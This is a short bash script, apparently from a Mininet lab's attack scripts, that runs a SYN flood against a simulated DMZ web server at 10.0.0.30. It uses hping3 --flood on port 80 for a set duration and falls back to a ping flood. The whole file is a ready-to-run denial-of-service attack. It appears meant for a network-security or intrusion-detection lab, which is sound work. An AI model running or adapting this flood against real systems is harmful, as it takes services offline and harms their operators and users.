#!/bin/bash
# DDoS attack — SYN flood targeting DMZ Web Server
# Usage (in Mininet CLI): attacker bash attack_scripts/ddos.sh
# Stop with Ctrl+C

TARGET="10.0.0.30"
DURATION=${1:-30}

echo "=== DDoS ATTACK (SYN Flood) ==="
echo "Target: $TARGET"
echo "Duration: ${DURATION}s"
echo "Press Ctrl+C to stop"
echo ""

if command -v hping3 &> /dev/null; then
    timeout $DURATION hping3 --flood -S -p 80 $TARGET 2>/dev/null
elif command -v ping &> /dev/null; then
    echo "hping3 not available, using ping flood..."
    timeout $DURATION ping -f $TARGET 2>/dev/null
else
    echo "No flood tools available"
fi

echo ""
echo "=== DDoS STOPPED ==="
